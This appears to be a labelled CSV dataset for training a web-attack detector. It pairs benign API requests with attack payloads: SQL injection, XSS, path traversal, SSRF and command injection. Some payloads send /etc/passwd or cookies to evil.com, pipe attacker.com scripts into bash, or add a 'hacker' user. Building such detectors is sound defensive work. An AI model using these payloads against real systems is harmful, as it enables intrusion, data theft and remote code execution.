"text","label"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"category=audio page=3","0"
"page=19&limit=20","0"
"user_id=228&action=view","0"
"password spray attack detected multiple users","1"
"search=laptop","0"
"GET /config.php HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"cmd=`id`","1"
"POST /api/login body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"user_id=555&action=view","0"
"GET /dashboard/9817","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=1 UNION SELECT user(),database()--","1"
"Authorization: Bearer validtoken357","0"
"fetch=http://internal-service:8080/secret","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /robots.txt scan probe reconnaissance","1"
"POST /api/data body=command& net user hacker Password1 /add","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"limit=20&offset=0","0"
"GET /config.php HTTP/1.1","1"
"page=15&limit=50","0"
"Authorization: Bearer validtoken950","0"
"php://filter/convert.base64-encode/resource=config.php","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=laptop&sort=price","0"
"POST /api/data body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"comment=<body onload=alert(1)>","1"
"user_id=515&action=view","0"
"search=phone","0"
"username=root&password=letmein","1"
"GET /api/users User-Agent: python-requests/2.31.0","0"
"host=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"filename=; ping -c 4 attacker.com","1"
"POST /api/orders body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"PUT /api/data User-Agent: axios/1.6.0","0"
"GET /api/files?name=../../../../var/log/apache2/access.log","1"
"GET /api/search?q=<video src=1 onerror=alert(1)>","1"
"POST /api/login username=' OR 1=1# password=test","1"
"../../../var/www/html/config.php","1"
"multiple failed login attempts detected for admin","1"
"name=Sara email=428@mail.com","0"
"GET /api/login/5172","0"
"path=....//....//etc/passwd","1"
"name=Sara email=14@mail.com","0"
"POST /profile?q=smartphone&brand=samsung","0"
"id=1 OR 1=1","1"
"POST /api/data body=command; python -c 'import socket,subprocess'","1"
"category=tablets page=8","0"
"ping=; cat /etc/shadow","1"
"include=file:///etc/passwd","1"
"GET /api/login?search=laptop&sort=price","0"
"order_id=ORD-1703 status=confirmed","0"
"POST /profile body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"POST /api/feedback body=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"url=http://metadata.google.internal","1"
"GET /health HTTP/1.1","0"
"order_id=ORD-6077 status=confirmed","0"
"category=audio page=6","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"category=audio page=1","0"
"id=123&format=json","0"
"GET /.env HTTP/1.1","1"
"page=9&limit=50","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"login attempt failed username admin invalid credentials","1"
"POST /api/data body=command& ipconfig","1"
"POST /settings body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"PUT /api/users User-Agent: python-requests/2.31.0","0"
"brute force attempt on login endpoint from single ip","1"
"order_id=ORD-3851 status=confirmed","0"
"search=laptop","0"
"username=1 OR 1=1","1"
"name=<scr ipt>alert(1)</scr ipt>","1"
"comment=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"category=electronics&page=1","0"
"GET /robots.txt scan probe reconnaissance","1"
"search=laptop","0"
"comment=<div onmouseover=alert(1)>hover</div>","1"
"name=<script >alert(1)</script >","1"
"page=23&limit=10","0"
"POST /api/users body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"exec=; cat /etc/shadow","1"
"title=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"user_id=449&action=view","0"
"order_id=ORD-3425 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /dashboard body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"user=1 OR 1=1","1"
"GET /wp-admin HTTP/1.1","1"
"path=../../../../var/log/apache2/access.log","1"
"url=http://127.0.0.1/admin","1"
"order_id='; EXEC master..xp_dirtree '\\\\attacker.com\\share'--","1"
"POST /api/data?q=smartphone&brand=samsung","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"search=tablet","0"
"GET /api/files?name=../../../.env","1"
"GET /web.config HTTP/1.1","1"
"GET /api/users?id=' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"GET /health HTTP/1.1","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"user_id=130&action=view","0"
"GET /api/search/2687","0"
"name=Nour email=410@mail.com","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"exec=& net user hacker Password1 /add","1"
"category=phones page=5","0"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"PUT /dashboard?date=2024-01-15&type=order","0"
"page=27&limit=50","0"
"search=phone","0"
"GET /api/orders?q=smartphone&brand=samsung","0"
"GET /robots.txt scan probe reconnaissance","1"
"GET /health HTTP/1.1","0"
"POST /api/users body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"file=../../../../etc/shadow","1"
"username=user&password=superman","1"
"GET /api/files?name=../../../../proc/self/environ","1"
"search=<img src=`javascript:alert(1)`>","1"
"name=Sara email=243@mail.com","0"
"description=';alert(String.fromCharCode(88,83,83))//","1"
"user_id=771&action=view","0"
"url=gopher://127.0.0.1:25/","1"
"category=tablets page=8","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"POST /api/search body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /.env HTTP/1.1","1"
"password spray attack detected multiple users","1"
"GET /admin HTTP/1.1","1"
"status=pending&priority=high","0"
"password spray attack detected multiple users","1"
"url=http://127.0.0.1/admin","1"
"username=admin&password=admin123","1"
"id=123&format=json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"DELETE /api/data User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"id=123&format=json","0"
"POST /api/orders?search=laptop&sort=price","0"
"GET /settings/9714","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"1' AND SLEEP(5)--","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"..%2F..%2F..%2Fetc%2Fpasswd","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"brute force attempt on login endpoint from single ip","1"
"user_id=220&action=view","0"
"search=1' OR '1'='1' /*","1"
"search=laptop","0"
"user_id=91&action=view","0"
"PUT /api/users User-Agent: axios/1.6.0","0"
"DELETE /dashboard?search=laptop&sort=price","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/data body=command; ping -c 4 attacker.com","1"
"page=36&limit=20","0"
"POST /api/users body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"login attempt failed username admin invalid credentials","1"
"username=user&password=password123","1"
"order_id=ORD-4057 status=confirmed","0"
"page=11&limit=20","0"
"description=<details open ontoggle=alert(1)>","1"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"brute force attempt on login endpoint from single ip","1"
"username=admin&password=letmein","1"
"Authorization: Bearer validtoken121","0"
"POST /api/login body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /robots.txt scan probe reconnaissance","1"
"category=laptops page=5","0"
"multiple failed login attempts detected for admin","1"
"file=php://filter/convert.base64-encode/resource=config.php","1"
"POST /settings body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"ping=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"order_id=ORD-4315 status=confirmed","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"user_id=977&action=view","0"
"PUT /profile User-Agent: axios/1.6.0","0"
"password spray attack detected multiple users","1"
"user=1 OR 1=1","1"
"DELETE /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"DELETE /dashboard?date=2024-01-15&type=order","0"
"order_id=ORD-7890 status=confirmed","0"
"url=http://metadata.google.internal","1"
"GET /dashboard/7517","0"
"page=2&limit=50","0"
"user_id=304&action=view","0"
"category=electronics&page=1","0"
"Authorization: Bearer validtoken540","0"
"exec=$(curl -s http://attacker.com/shell.sh)","1"
"host=| wget http://attacker.com/shell.sh","1"
"order_id=ORD-9562 status=confirmed","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/files?name=php://filter/convert.base64-encode/resource=config.php","1"
"page=46&limit=50","0"
"GET /health HTTP/1.1","0"
"GET /api/data/2675","0"
"username=admin&password=admin","1"
"PUT /profile User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"user_id=745&action=view","0"
"repeated authentication failure admin account locked","1"
"GET /console HTTP/1.1","1"
"user=ahmed&filter=active","0"
"url=http://10.0.0.1","1"
"POST /api/data body=command; cat /etc/shadow","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=tablets page=9","0"
"User-Agent: masscan/1.3","1"
"search=tablet","0"
"user_id=176&action=view","0"
"filename=& whoami","1"
"Authorization: Bearer validtoken661","0"
"file=/etc/passwd%00","1"
"search=tablet","0"
"DELETE /api/login?category=electronics&page=1","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Authorization: Bearer validtoken850","0"
"login attempt failed username admin invalid credentials","1"
"order_id=ORD-5434 status=confirmed","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"order_id=ORD-1587 status=confirmed","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"name=Sara email=285@mail.com","0"
"GET /profile/4192","0"
"search=phone","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"Authorization: Bearer validtoken695","0"
"GET /server-status HTTP/1.1","1"
"order_id=ORD-1991 status=confirmed","0"
"description=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"POST /api/feedback body=';alert(String.fromCharCode(88,83,83))//","1"
"POST /dashboard body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"username=administrator&password=letmein","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/search?q=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"GET /admin HTTP/1.1","1"
"category=phones page=3","0"
"PUT /api/search?category=electronics&page=1","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user_id=330&action=view","0"
"search=1 UNION SELECT 1,2,3--","1"
"search=<script>alert(1)</script>","1"
"Authorization: Bearer validtoken607","0"
"DELETE /api/products User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"repeated authentication failure admin account locked","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /api/users?id=' OR ''='","1"
"category=tablets page=3","0"
"' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"name=Ahmed email=843@mail.com","0"
"date=2024-01-15&type=order","0"
"../../.git/config","1"
"GET /api/swagger.json HTTP/1.1","1"
"Authorization: Bearer validtoken867","0"
"name=Lina email=51@mail.com","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"category=phones page=10","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"....//....//etc/passwd","1"
"user_id=820&action=view","0"
"PUT /api/search?limit=20&offset=0","0"
"user_id=321&action=view","0"
"; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"password spray attack detected multiple users","1"
"user_id=259&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=40&limit=10","0"
"POST /api/users User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"username=admin&password=qwerty","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"DELETE /api/search User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"GET /console HTTP/1.1","1"
"filename=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"order_id=ORD-8968 status=confirmed","0"
"name=Lina email=275@mail.com","0"
"Authorization: Bearer validtoken668","0"
"order_id=ORD-1373 status=confirmed","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /.git/config HTTP/1.1","1"
"repeated authentication failure admin account locked","1"
"name=Sara email=470@mail.com","0"
"category=phones page=4","0"
"filename=`curl -s http://attacker.com/shell.sh | bash`","1"
"name=Omar email=193@mail.com","0"
"GET /api/search?q=<ScRiPt>alert(1)</ScRiPt>","1"
"DELETE /api/login?limit=20&offset=0","0"
"user_id=267&action=view","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"path=file:///etc/passwd","1"
"url=http://192.168.1.1","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=tablet","0"
"description=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"name=Lina email=631@mail.com","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=laptop","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"search=<a href='javascript:alert(1)'>click</a>","1"
"POST /api/data body=command| cat /etc/passwd","1"
"page=47&limit=50","0"
"GET /health HTTP/1.1","0"
"id=1 UNION SELECT 1,2,3--","1"
"POST /api/search body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"user_id=884&action=view","0"
"GET /health HTTP/1.1","0"
"Authorization: Bearer validtoken400","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"../../../.env","1"
"category=tablets page=2","0"
"GET /dashboard/398","0"
"search=laptop","0"
"POST /api/login username=1' OR 0x31=0x31-- password=test","1"
"host=$(whoami)","1"
"username=admin&password=monkey","1"
"GET /health HTTP/1.1","0"
"url=file:///etc/passwd","1"
"DELETE /profile?search=laptop&sort=price","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"user_id=607&action=view","0"
"search=headphones","0"
"repeated authentication failure admin account locked","1"
"order_id=ORD-7041 status=confirmed","0"
"page=4&limit=50","0"
"user_id=825&action=view","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
